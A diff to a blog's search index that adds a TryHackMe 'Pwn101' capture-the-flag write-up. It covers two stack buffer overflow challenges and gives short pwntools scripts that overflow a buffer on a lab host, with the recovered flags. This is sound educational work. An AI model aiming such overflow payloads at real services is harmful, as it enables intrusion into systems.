@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>[THM] Pwn101 Writeup</title>
+      <link href="/posts/83b7f1b/"/>
+      <url>/posts/83b7f1b/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Challenge-1-pwn101">Challenge 1 - pwn101</h1><p>First, we use IDA to decompile the binary it gave us. We can see that the program declare a 60 bytes array for char v4. And the winnning condition is to use v4 to overflow and cover the value of v5, which is 1337 initially. Since it didn’t ask us to make v5 to a specific value, we can just make sure it not equal to 1337.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141210657.png" alt="IDA Decompiled Code"></p><p>To do that, I use a Python script to do it.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"10.10.153.228"</span><span class="token punctuation">,</span> <span class="token number">9001</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Type the required ingredients to make briyani:"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">61</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141712693.png" alt="Flag"></p><pre class="line-numbers language-none"><code class="language-none">THM&#123;7h4t&#39;s_4n_3zy_oveRflowwwww&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Challenge-2-pwn102">Challenge 2 - pwn102</h1><p>First step, IDA decompile the binary.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144645154.png" alt="IDA Decompiled Code"></p><p>According to the code, we can know that the char v4 is a 104 bytes array, and the winning condition is to let v5 equals to <code>0xC0FF330000C0D3</code>. So we can simply overflow the v4 to cover v5. The exploit is as follow.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">104</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xC0FF330000C0D3</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"10.10.153.228"</span><span class="token punctuation">,</span> <span class="token number">9002</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Am I right?"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By running this script, we can get the shell to cat the flag out.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144940194.png" alt="Flag"></p><pre class="line-numbers language-none"><code class="language-none">THM&#123;y3s_1_n33D_C0ff33_to_C0d3_&lt;3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> TryHackMe </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Pwn </tag>
+            
+            <tag> Hacking </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[Day 14] 用THM+影片繼續學Pwn</title>
       <link href="/posts/e58d0fa3/"/>
       <url>/posts/e58d0fa3/</url>
@@ -140,9 +171,9 @@
             
             <tag> HTB </tag>
             
-            <tag> Web </tag>
-            
             <tag> HackTheBox </tag>
+            
+            <tag> Web </tag>
             
         </tags>
       
